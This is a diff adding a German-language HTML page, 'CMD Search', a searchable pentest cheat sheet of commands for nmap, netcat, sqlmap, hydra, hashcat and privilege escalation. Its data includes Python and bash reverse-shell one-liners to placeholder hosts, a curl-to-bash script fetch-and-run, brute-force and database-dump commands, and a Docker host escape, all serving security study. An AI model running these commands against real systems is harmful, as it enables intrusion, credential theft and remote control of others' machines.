@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CMD Search</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:       #0a0c0f;
+    --surface:  #0f1318;
+    --border:   #1e2530;
+    --accent:   #00e5a0;
+    --accent2:  #f0a500;
+    --dim:      #3a4555;
+    --muted:    #6b7f96;
+    --text:     #c8d8e8;
+    --bright:   #eaf4ff;
+    --red:      #ff4f6a;
+    --blue:     #3b9eff;
+    --purple:   #a78bfa;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.08) 2px,
+      rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* Ambient glow */
+  body::after {
+    content: '';
+    position: fixed;
+    top: -30vh;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 80vw;
+    height: 60vh;
+    background: radial-gradient(ellipse, rgba(0,229,160,0.04) 0%, transparent 70%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* ─── Header ─── */
+  header {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(10,12,15,0.92);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 clamp(1rem, 4vw, 3rem);
+  }
+
+  .header-inner {
+    max-width: 1100px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    gap: 1.5rem;
+    padding: 1rem 0;
+  }
+
+  .logo {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.4rem;
+    font-weight: 800;
+    color: var(--bright);
+    letter-spacing: -0.02em;
+    flex-shrink: 0;
+    user-select: none;
+  }
+
+  .logo span { color: var(--accent); }
+
+  /* ─── Search ─── */
+  .search-wrap {
+    flex: 1;
+    position: relative;
+    display: flex;
+    align-items: center;
+  }
+
+  .search-prefix {
+    position: absolute;
+    left: 1rem;
+    color: var(--accent);
+    font-size: 1rem;
+    pointer-events: none;
+    user-select: none;
+  }
+
+  #search {
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--bright);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.9rem;
+    padding: 0.6rem 1rem 0.6rem 2.4rem;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    caret-color: var(--accent);
+  }
+
+  #search:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 2px rgba(0,229,160,0.12), 0 0 20px rgba(0,229,160,0.06);
+  }
+
+  #search::placeholder { color: var(--dim); }
+
+  .result-count {
+    flex-shrink: 0;
+    font-size: 0.75rem;
+    color: var(--muted);
+    white-space: nowrap;
+  }
+
+  .result-count strong { color: var(--accent); }
+
+  /* ─── Layout ─── */
+  .page {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 1.5rem clamp(1rem, 4vw, 3rem) 4rem;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* ─── Filter bar ─── */
+  .filter-bar {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-bottom: 1.5rem;
+  }
+
+  .tag-btn {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    padding: 0.3rem 0.7rem;
+    cursor: pointer;
+    transition: all 0.15s;
+    user-select: none;
+  }
+
+  .tag-btn:hover { border-color: var(--dim); color: var(--text); }
+
+  .tag-btn.active {
+    background: rgba(0,229,160,0.1);
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
+  /* ─── Command grid ─── */
+  #results {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(min(100%, 480px), 1fr));
+    gap: 0.75rem;
+  }
+
+  /* ─── Card ─── */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    transition: border-color 0.2s, transform 0.15s, box-shadow 0.2s;
+    animation: fadeIn 0.25s ease both;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(6px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .card:hover {
+    border-color: var(--dim);
+    transform: translateY(-1px);
+    box-shadow: 0 4px 24px rgba(0,0,0,0.4);
+  }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    padding: 0.7rem 1rem;
+    border-bottom: 1px solid var(--border);
+    background: rgba(255,255,255,0.018);
+  }
+
+  .card-icon {
+    width: 22px;
+    height: 22px;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.7rem;
+    font-weight: 700;
+    flex-shrink: 0;
+    letter-spacing: 0;
+  }
+
+  .card-title {
+    font-size: 0.8rem;
+    font-weight: 500;
+    color: var(--bright);
+    flex: 1;
+    min-width: 0;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+
+  .card-tags {
+    display: flex;
+    gap: 0.3rem;
+    flex-wrap: wrap;
+  }
+
+  .pill {
+    font-size: 0.65rem;
+    padding: 0.15rem 0.5rem;
+    border-radius: 100px;
+    border: 1px solid;
+    opacity: 0.8;
+  }
+
+  /* ─── Command block ─── */
+  .cmd-block {
+    position: relative;
+    padding: 0.9rem 1rem;
+  }
+
+  .cmd-desc {
+    font-size: 0.72rem;
+    color: var(--muted);
+    margin-bottom: 0.7rem;
+    line-height: 1.6;
+  }
+
+  .cmd-line {
+    background: #070a0d;
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 0.65rem 3rem 0.65rem 0.85rem;
+    font-size: 0.78rem;
+    color: var(--accent);
+    word-break: break-all;
+    line-height: 1.7;
+    position: relative;
+  }
+
+  /* syntax highlights */
+  .cmd-line .flag  { color: var(--accent2); }
+  .cmd-line .val   { color: var(--blue); }
+  .cmd-line .kw    { color: var(--purple); }
+
+  .copy-btn {
+    position: absolute;
+    top: 0.5rem;
+    right: 0.5rem;
+    background: var(--border);
+    border: none;
+    border-radius: 4px;
+    color: var(--muted);
+    cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    padding: 0.25rem 0.5rem;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+
+  .copy-btn:hover  { background: var(--dim); color: var(--bright); }
+  .copy-btn.copied { background: rgba(0,229,160,0.2); color: var(--accent); }
+
+  /* ─── No results ─── */
+  #no-results {
+    display: none;
+    text-align: center;
+    padding: 5rem 0;
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  #no-results .big { font-size: 3rem; display: block; margin-bottom: 1rem; opacity: 0.4; }
+
+  /* ─── Highlight match ─── */
+  mark {
+    background: rgba(240,165,0,0.25);
+    color: var(--accent2);
+    border-radius: 2px;
+    padding: 0 1px;
+  }
+
+  /* ─── Category colors ─── */
+  [data-cat="nmap"]       .card-icon { background: rgba(59,158,255,0.15); color: #3b9eff; }
+  [data-cat="netcat"]     .card-icon { background: rgba(0,229,160,0.15); color: var(--accent); }
+  [data-cat="curl"]       .card-icon { background: rgba(167,139,250,0.15); color: var(--purple); }
+  [data-cat="sqlmap"]     .card-icon { background: rgba(255,79,106,0.15); color: var(--red); }
+  [data-cat="bash"]       .card-icon { background: rgba(240,165,0,0.15); color: var(--accent2); }
+  [data-cat="python"]     .card-icon { background: rgba(59,158,255,0.15); color: #3b9eff; }
+  [data-cat="gobuster"]   .card-icon { background: rgba(255,79,106,0.15); color: var(--red); }
+  [data-cat="ffuf"]       .card-icon { background: rgba(167,139,250,0.15); color: var(--purple); }
+  [data-cat="hydra"]      .card-icon { background: rgba(255,79,106,0.15); color: var(--red); }
+  [data-cat="ssh"]        .card-icon { background: rgba(0,229,160,0.15); color: var(--accent); }
+  [data-cat="openssl"]    .card-icon { background: rgba(240,165,0,0.15); color: var(--accent2); }
+  [data-cat="john"]       .card-icon { background: rgba(255,79,106,0.15); color: var(--red); }
+  [data-cat="hashcat"]    .card-icon { background: rgba(167,139,250,0.15); color: var(--purple); }
+  [data-cat="linux"]      .card-icon { background: rgba(240,165,0,0.15); color: var(--accent2); }
+  [data-cat="docker"]     .card-icon { background: rgba(59,158,255,0.15); color: #3b9eff; }
+  [data-cat="git"]        .card-icon { background: rgba(255,79,106,0.15); color: var(--red); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <div class="logo">CMD<span>Search</span></div>
+    <div class="search-wrap">
+      <span class="search-prefix">$</span>
+      <input id="search" type="text" placeholder="nmap -sV ... sudo nc ... curl -X POST ..." autocomplete="off" spellcheck="false" autofocus>
+    </div>
+    <div class="result-count" id="count"><strong>0</strong> commands</div>
+  </div>
+</header>
+
+<div class="page">
+  <div class="filter-bar" id="filters"></div>
+  <div id="results"></div>
+  <div id="no-results">
+    <span class="big">∅</span>
+    Kein Command gefunden – versuch einen anderen Begriff.
+  </div>
+</div>
+
+<script>
+// ─────────────────────────────────────────────
+//  DATENBANK  –  hier eigene Commands ergänzen
+// ─────────────────────────────────────────────
+const DB = [
+  // ── NMAP ───────────────────────────────────
+  {
+    cat: "nmap", title: "Full TCP SYN Scan",
+    desc: "Schneller SYN-Scan aller 65535 Ports mit Service-Erkennung und Standard-Scripts.",
+    cmd: "nmap -sV -sC -p- --min-rate 5000 -oA full_tcp {TARGET}",
+    tags: ["reconnaissance", "portscan"]
+  },
+  {
+    cat: "nmap", title: "UDP Top-1000 Scan",
+    desc: "UDP-Scan der 1000 häufigsten Ports. Langsamer, aber findet DNS/SNMP/TFTP.",
+    cmd: "sudo nmap -sU --top-ports 1000 -oA udp {TARGET}",
+    tags: ["reconnaissance", "udp"]
+  },
+  {
+    cat: "nmap", title: "OS Detection",
+    desc: "Betriebssystem- und Version-Erkennung mit aggressivem Timing.",
+    cmd: "sudo nmap -O -sV -T4 {TARGET}",
+    tags: ["reconnaissance", "os"]
+  },
+  {
+    cat: "nmap", title: "NSE Vuln Scan",
+    desc: "Führt alle vuln-Scripts aus dem NSE-Katalog aus.",
+    cmd: "nmap --script vuln -sV -p {PORTS} {TARGET}",
+    tags: ["vulnerability", "nse"]
+  },
+  {
+    cat: "nmap", title: "SMB Scripts",
+    desc: "Enumeriert SMB-Shares, User und prüft bekannte SMB-Schwachstellen.",
+    cmd: "nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-vuln* {TARGET}",
+    tags: ["smb", "enumeration"]
+  },
+
+  // ── NETCAT ─────────────────────────────────
+  {
+    cat: "netcat", title: "Listener (Reverse Shell)",
+    desc: "Öffnet einen TCP-Listener auf dem Angreifer-System.",
+    cmd: "nc -lvnp {PORT}",
+    tags: ["shell", "listener"]
+  },
+  {
+    cat: "netcat", title: "Banner Grab",
+    desc: "Verbindet sich mit einem Port und liest den Banner.",
+    cmd: "nc -nv {TARGET} {PORT}",
+    tags: ["reconnaissance", "banner"]
+  },
+  {
+    cat: "netcat", title: "File Transfer (Empfänger)",
+    desc: "Empfängt eine Datei über Netcat und speichert sie lokal.",
+    cmd: "nc -lvnp {PORT} > output.file",
+    tags: ["filetransfer"]
+  },
+  {
+    cat: "netcat", title: "File Transfer (Sender)",
+    desc: "Sendet eine Datei zu einem laufenden Netcat-Listener.",
+    cmd: "nc -nv {TARGET} {PORT} < input.file",
+    tags: ["filetransfer"]
+  },
+
+  // ── CURL ───────────────────────────────────
+  {
+    cat: "curl", title: "HTTP POST mit JSON",
+    desc: "Sendet einen POST-Request mit JSON-Body und setzt den Content-Type Header.",
+    cmd: "curl -s -X POST {URL} -H 'Content-Type: application/json' -d '{\"key\":\"value\"}'",
+    tags: ["http", "api"]
+  },
+  {
+    cat: "curl", title: "Datei herunterladen",
+    desc: "Lädt eine Datei herunter und speichert sie unter dem Original-Dateinamen.",
+    cmd: "curl -LO {URL}",
+    tags: ["download"]
+  },
+  {
+    cat: "curl", title: "Custom Header + Auth",
+    desc: "Request mit Bearer-Token und eigenem Header.",
+    cmd: "curl -s -H 'Authorization: Bearer {TOKEN}' -H 'X-Custom: value' {URL}",
+    tags: ["http", "auth", "api"]
+  },
+  {
+    cat: "curl", title: "Proxy (Burp Suite)",
+    desc: "Leitet den Request durch Burp Suite (localhost:8080) für Interception.",
+    cmd: "curl -x http://127.0.0.1:8080 -k {URL}",
+    tags: ["proxy", "burp"]
+  },
+  {
+    cat: "curl", title: "SSRF Probe",
+    desc: "Testet auf Server-Side Request Forgery mit internem Ziel.",
+    cmd: "curl -s '{URL}?url=http://127.0.0.1:80/'",
+    tags: ["ssrf", "vulnerability"]
+  },
+
+  // ── GOBUSTER ───────────────────────────────
+  {
+    cat: "gobuster", title: "Directory Bruteforce",
+    desc: "Brute-forcet Verzeichnisse und Dateien mit gängiger Wordlist.",
+    cmd: "gobuster dir -u {URL} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50",
+    tags: ["web", "fuzzing", "enumeration"]
+  },
+  {
+    cat: "gobuster", title: "DNS Subdomain Scan",
+    desc: "Enumeriert Subdomains einer Domain.",
+    cmd: "gobuster dns -d {DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50",
+    tags: ["dns", "subdomain", "enumeration"]
+  },
+  {
+    cat: "gobuster", title: "VHost Fuzzing",
+    desc: "Findet virtuelle Hosts (vhosts) auf einem Webserver.",
+    cmd: "gobuster vhost -u http://{TARGET} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
+    tags: ["vhost", "web", "enumeration"]
+  },
+
+  // ── FFUF ───────────────────────────────────
+  {
+    cat: "ffuf", title: "Web Fuzzing GET",
+    desc: "Fuzzt URL-Pfade mit ffuf und filtert nach Statuscode 404.",
+    cmd: "ffuf -u {URL}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc all -fc 404",
+    tags: ["web", "fuzzing"]
+  },
+  {
+    cat: "ffuf", title: "POST Parameter Fuzzing",
+    desc: "Fuzzt POST-Parameter (z. B. Login-Formular).",
+    cmd: "ffuf -u {URL} -X POST -d 'user=FUZZ&pass=test' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -mc 200",
+    tags: ["web", "fuzzing", "brute"]
+  },
+  {
+    cat: "ffuf", title: "Subdomain Fuzzing",
+    desc: "Findet Subdomains über den Host-Header.",
+    cmd: "ffuf -u http://{DOMAIN} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200",
+    tags: ["dns", "subdomain", "fuzzing"]
+  },
+
+  // ── SQLMAP ─────────────────────────────────
+  {
+    cat: "sqlmap", title: "Basis-Scan",
+    desc: "Testet eine URL auf SQL-Injection-Schwachstellen.",
+    cmd: "sqlmap -u '{URL}?id=1' --batch --dbs",
+    tags: ["sqli", "database"]
+  },
+  {
+    cat: "sqlmap", title: "POST Request Scan",
+    desc: "Liest einen gespeicherten Burp-Request und scannt auf SQLi.",
+    cmd: "sqlmap -r request.txt --batch --level 5 --risk 3 --dbs",
+    tags: ["sqli", "database"]
+  },
+  {
+    cat: "sqlmap", title: "Tabellen dumpen",
+    desc: "Dumpt alle Tabellen einer spezifischen Datenbank.",
+    cmd: "sqlmap -u '{URL}?id=1' -D {DB} --tables --dump --batch",
+    tags: ["sqli", "database", "exfiltration"]
+  },
+
+  // ── HYDRA ──────────────────────────────────
+  {
+    cat: "hydra", title: "SSH Brute Force",
+    desc: "Brute-forcet SSH-Zugangsdaten mit einer Passwort-Liste.",
+    cmd: "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET}",
+    tags: ["brute", "ssh", "password"]
+  },
+  {
+    cat: "hydra", title: "HTTP Form Brute Force",
+    desc: "Brute-forcet ein Login-Formular via POST.",
+    cmd: "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} http-post-form '/login:username=^USER^&password=^PASS^:Invalid'",
+    tags: ["brute", "web", "password"]
+  },
+  {
+    cat: "hydra", title: "FTP Brute Force",
+    desc: "Brute-forcet FTP mit Benutzerliste und Passwortliste.",
+    cmd: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://{TARGET}",
+    tags: ["brute", "ftp", "password"]
+  },
+
+  // ── SSH ────────────────────────────────────
+  {
+    cat: "ssh", title: "Verbindung mit Key",
+    desc: "SSH-Verbindung mit einem privaten Key-File.",
+    cmd: "ssh -i {KEYFILE} {USER}@{TARGET}",
+    tags: ["access", "authentication"]
+  },
+  {
+    cat: "ssh", title: "Local Port Forward",
+    desc: "Leitet einen Remote-Port auf den lokalen Rechner weiter.",
+    cmd: "ssh -L {LPORT}:127.0.0.1:{RPORT} {USER}@{TARGET} -N",
+    tags: ["tunneling", "portforward"]
+  },
+  {
+    cat: "ssh", title: "Remote Port Forward",
+    desc: "Öffnet einen Tunnel vom Remote-Host zurück zum lokalen Rechner.",
+    cmd: "ssh -R {RPORT}:127.0.0.1:{LPORT} {USER}@{TARGET} -N",
+    tags: ["tunneling", "portforward"]
+  },
+  {
+    cat: "ssh", title: "Dynamic SOCKS Proxy",
+    desc: "Erstellt einen SOCKS5-Proxy-Tunnel für Proxychains.",
+    cmd: "ssh -D 1080 -N -f {USER}@{TARGET}",
+    tags: ["tunneling", "proxy", "socks"]
+  },
+  {
+    cat: "ssh", title: "SCP File Transfer",
+    desc: "Kopiert eine Datei vom Remote-Host auf den lokalen Rechner.",
+    cmd: "scp -i {KEYFILE} {USER}@{TARGET}:{REMOTE_PATH} {LOCAL_PATH}",
+    tags: ["filetransfer"]
+  },
+
+  // ── JOHN ───────────────────────────────────
+  {
+    cat: "john", title: "Hash cracken (rockyou)",
+    desc: "Knackt Hash-Dateien mit der rockyou Wortliste.",
+    cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt {HASHFILE}",
+    tags: ["cracking", "password", "hash"]
+  },
+  {
+    cat: "john", title: "ZIP Passwort cracken",
+    desc: "Extrahiert Hash aus ZIP und knackt ihn mit John.",
+    cmd: "zip2john {FILE}.zip > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+    tags: ["cracking", "password", "zip"]
+  },
+  {
+    cat: "john", title: "Ergebnisse anzeigen",
+    desc: "Zeigt bereits gecrackte Passwörter aus der Pot-Datei.",
+    cmd: "john --show {HASHFILE}",
+    tags: ["cracking", "password"]
+  },
+
+  // ── HASHCAT ────────────────────────────────
+  {
+    cat: "hashcat", title: "MD5 cracken",
+    desc: "Knackt MD5-Hashes mit Wörterbuch-Angriff (Mode 0).",
+    cmd: "hashcat -m 0 -a 0 {HASHFILE} /usr/share/wordlists/rockyou.txt",
+    tags: ["cracking", "password", "hash", "md5"]
+  },
+  {
+    cat: "hashcat", title: "NTLM cracken",
+    desc: "Knackt NTLM-Hashes (Windows) mit rockyou.",
+    cmd: "hashcat -m 1000 -a 0 {HASHFILE} /usr/share/wordlists/rockyou.txt",
+    tags: ["cracking", "password", "ntlm", "windows"]
+  },
+  {
+    cat: "hashcat", title: "SHA-256 cracken",
+    desc: "Knackt SHA-256-Hashes mit Wörterbuch + Regeln.",
+    cmd: "hashcat -m 1400 -a 0 {HASHFILE} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+    tags: ["cracking", "password", "sha256"]
+  },
+
+  // ── PYTHON ─────────────────────────────────
+  {
+    cat: "python", title: "HTTP Server",
+    desc: "Startet einen simplen HTTP-Fileserver auf Port 8000.",
+    cmd: "python3 -m http.server {PORT}",
+    tags: ["server", "filetransfer"]
+  },
+  {
+    cat: "python", title: "Reverse Shell (Python3)",
+    desc: "Python3 One-Liner für eine Reverse Shell.",
+    cmd: "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{IP}',{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
+    tags: ["shell", "reverse"]
+  },
+  {
+    cat: "python", title: "TTY Upgrade",
+    desc: "Upgraded eine einfache Shell zu einer voll-interaktiven PTY.",
+    cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+    tags: ["shell", "pty", "upgrade"]
+  },
+
+  // ── BASH ───────────────────────────────────
+  {
+    cat: "bash", title: "SUID Files finden",
+    desc: "Sucht nach Dateien mit gesetztem SUID-Bit (Privilege Escalation).",
+    cmd: "find / -perm -4000 -type f 2>/dev/null",
+    tags: ["privesc", "linux", "suid"]
+  },
+  {
+    cat: "bash", title: "World-Writable Dirs",
+    desc: "Findet für alle beschreibbare Verzeichnisse.",
+    cmd: "find / -writable -type d 2>/dev/null | grep -v proc",
+    tags: ["privesc", "linux"]
+  },
+  {
+    cat: "bash", title: "Cron Jobs anzeigen",
+    desc: "Listet alle Cron-Jobs auf dem System auf.",
+    cmd: "cat /etc/crontab && ls -la /etc/cron.*/ && crontab -l 2>/dev/null",
+    tags: ["privesc", "linux", "cron"]
+  },
+  {
+    cat: "bash", title: "Passwörter in Dateien suchen",
+    desc: "Rekursive Suche nach dem String 'password' in Textdateien.",
+    cmd: "grep -rn 'password' /var/www/ 2>/dev/null --include='*.php,*.conf,*.txt,*.env'",
+    tags: ["enumeration", "linux", "credentials"]
+  },
+  {
+    cat: "bash", title: "Netzwerk-Verbindungen",
+    desc: "Zeigt aktive TCP-Verbindungen und lauschende Ports.",
+    cmd: "ss -tnlp",
+    tags: ["network", "linux", "enumeration"]
+  },
+  {
+    cat: "bash", title: "Bash Reverse Shell",
+    desc: "One-Liner Bash Reverse Shell.",
+    cmd: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
+    tags: ["shell", "reverse"]
+  },
+
+  // ── OPENSSL ────────────────────────────────
+  {
+    cat: "openssl", title: "Zertifikat Info",
+    desc: "Zeigt Zertifikat-Details eines Servers (SAN, Ablaufdatum etc.).",
+    cmd: "openssl s_client -connect {TARGET}:443 2>/dev/null | openssl x509 -noout -text",
+    tags: ["tls", "ssl", "reconnaissance"]
+  },
+  {
+    cat: "openssl", title: "Passwort-Hash generieren",
+    desc: "Generiert einen SHA-512 crypt(3) Hash (für /etc/shadow).",
+    cmd: "openssl passwd -6 -salt xyz {PASSWORD}",
+    tags: ["password", "hash"]
+  },
+
+  // ── LINUX ──────────────────────────────────
+  {
+    cat: "linux", title: "Sudo Rechte prüfen",
+    desc: "Zeigt, welche Befehle der aktuelle User ohne Passwort mit sudo ausführen darf.",
+    cmd: "sudo -l",
+    tags: ["privesc", "sudo"]
+  },
+  {
+    cat: "linux", title: "LinPEAS ausführen",
+    desc: "Lädt LinPEAS herunter und führt es direkt aus (In-Memory).",
+    cmd: "curl -s https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash",
+    tags: ["privesc", "enumeration"]
+  },
+  {
+    cat: "linux", title: "Capabilities prüfen",
+    desc: "Listet Binaries mit gesetzten Linux-Capabilities auf.",
+    cmd: "getcap -r / 2>/dev/null",
+    tags: ["privesc", "capabilities"]
+  },
+  {
+    cat: "linux", title: "/etc/passwd prüfen",
+    desc: "Zeigt Benutzer mit Login-Shell (potentielle Ziele).",
+    cmd: "cat /etc/passwd | grep -v nologin | grep -v false",
+    tags: ["enumeration", "users"]
+  },
+
+  // ── DOCKER ─────────────────────────────────
+  {
+    cat: "docker", title: "Alle Container auflisten",
+    desc: "Zeigt alle laufenden und gestoppten Container.",
+    cmd: "docker ps -a",
+    tags: ["enumeration", "container"]
+  },
+  {
+    cat: "docker", title: "Container Shell",
+    desc: "Öffnet eine interaktive Shell in einem laufenden Container.",
+    cmd: "docker exec -it {CONTAINER_ID} /bin/bash",
+    tags: ["access", "container"]
+  },
+  {
+    cat: "docker", title: "Escape via Mounten",
+    desc: "Docker Escape: Mounted das Host-Filesystem in den Container.",
+    cmd: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    tags: ["privesc", "escape", "container"]
+  },
+
+  // ── GIT ────────────────────────────────────
+  {
+    cat: "git", title: "Commit-History durchsuchen",
+    desc: "Sucht in der gesamten Git-History nach einem String (z. B. Passwort).",
+    cmd: "git log --all --oneline | xargs -I{} git show {} | grep -i 'password'",
+    tags: ["secrets", "enumeration"]
+  },
+  {
+    cat: "git", title: "Gelöschte Dateien wiederherstellen",
+    desc: "Findet und stellt gelöschte Dateien aus der Git-History wieder her.",
+    cmd: "git log --all --full-history -- {FILEPATH}",
+    tags: ["forensics", "recovery"]
+  },
+];
+
+// ─────────────────────────────────────────────
+//  KATEGORIEN & FARBEN
+// ─────────────────────────────────────────────
+const CAT_META = {
+  nmap:     { short: "NM",  color: "#3b9eff" },
+  netcat:   { short: "NC",  color: "#00e5a0" },
+  curl:     { short: "CL",  color: "#a78bfa" },
+  sqlmap:   { short: "SQL", color: "#ff4f6a" },
+  bash:     { short: "SH",  color: "#f0a500" },
+  python:   { short: "PY",  color: "#3b9eff" },
+  gobuster: { short: "GB",  color: "#ff4f6a" },
+  ffuf:     { short: "FF",  color: "#a78bfa" },
+  hydra:    { short: "HY",  color: "#ff4f6a" },
+  ssh:      { short: "SSH", color: "#00e5a0" },
+  openssl:  { short: "SSL", color: "#f0a500" },
+  john:     { short: "JN",  color: "#ff4f6a" },
+  hashcat:  { short: "HC",  color: "#a78bfa" },
+  linux:    { short: "LX",  color: "#f0a500" },
+  docker:   { short: "DK",  color: "#3b9eff" },
+  git:      { short: "GIT", color: "#ff4f6a" },
+};
+
+// ─────────────────────────────────────────────
+//  UI INIT
+// ─────────────────────────────────────────────
+const searchEl  = document.getElementById('search');
+const resultsEl = document.getElementById('results');
+const countEl   = document.getElementById('count');
+const noResEl   = document.getElementById('no-results');
+const filtersEl = document.getElementById('filters');
+
+let activeFilter = null;
+
+// Build filter buttons
+const cats = [...new Set(DB.map(c => c.cat))];
+const allBtn = makeTagBtn('Alle', null);
+allBtn.classList.add('active');
+filtersEl.appendChild(allBtn);
+cats.forEach(cat => filtersEl.appendChild(makeTagBtn(cat, cat)));
+
+function makeTagBtn(label, cat) {
+  const btn = document.createElement('button');
+  btn.className = 'tag-btn';
+  btn.textContent = label;
+  btn.addEventListener('click', () => {
+    activeFilter = cat;
+    document.querySelectorAll('.tag-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    render();
+  });
+  return btn;
+}
+
+function highlight(text, query) {
+  if (!query) return escHtml(text);
+  const escaped = query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+  return escHtml(text).replace(new RegExp(escaped, 'gi'), m => `<mark>${m}</mark>`);
+}
+
+function escHtml(t) {
+  return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function pillHtml(tag, cat) {
+  const meta = CAT_META[cat] || { color: '#6b7f96' };
+  return `<span class="pill" style="color:${meta.color};border-color:${meta.color}40">${escHtml(tag)}</span>`;
+}
+
+function cardHtml(cmd, query) {
+  const meta = CAT_META[cmd.cat] || { short: '?', color: '#6b7f96' };
+  const tags = (cmd.tags || []).map(t => pillHtml(t, cmd.cat)).join('');
+  const highlightedCmd = highlight(cmd.cmd, query);
+
+  return `
+  <article class="card" data-cat="${escHtml(cmd.cat)}">
+    <div class="card-header">
+      <div class="card-icon">${meta.short}</div>
+      <div class="card-title">${highlight(cmd.title, query)}</div>
+      <div class="card-tags">${tags}</div>
+    </div>
+    <div class="cmd-block">
+      <div class="cmd-desc">${highlight(cmd.desc, query)}</div>
+      <div class="cmd-line">
+        ${highlightedCmd}
+        <button class="copy-btn" onclick="copyCmd(this, ${JSON.stringify(cmd.cmd)})">copy</button>
+      </div>
+    </div>
+  </article>`;
+}
+
+function render() {
+  const q = searchEl.value.trim().toLowerCase();
+  const terms = q.split(/\s+/).filter(Boolean);
+
+  const filtered = DB.filter(cmd => {
+    if (activeFilter && cmd.cat !== activeFilter) return false;
+    if (!terms.length) return true;
+    const hay = [cmd.cat, cmd.title, cmd.desc, cmd.cmd, ...(cmd.tags||[])].join(' ').toLowerCase();
+    return terms.every(t => hay.includes(t));
+  });
+
+  countEl.innerHTML = `<strong>${filtered.length}</strong> command${filtered.length !== 1 ? 's' : ''}`;
+
+  if (filtered.length === 0) {
+    resultsEl.innerHTML = '';
+    noResEl.style.display = 'block';
+  } else {
+    noResEl.style.display = 'none';
+    resultsEl.innerHTML = filtered.map(cmd => cardHtml(cmd, q)).join('');
+  }
+}
+
+function copyCmd(btn, text) {
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+
+searchEl.addEventListener('input', render);
+render();
+</script>
+</body>
+</html>
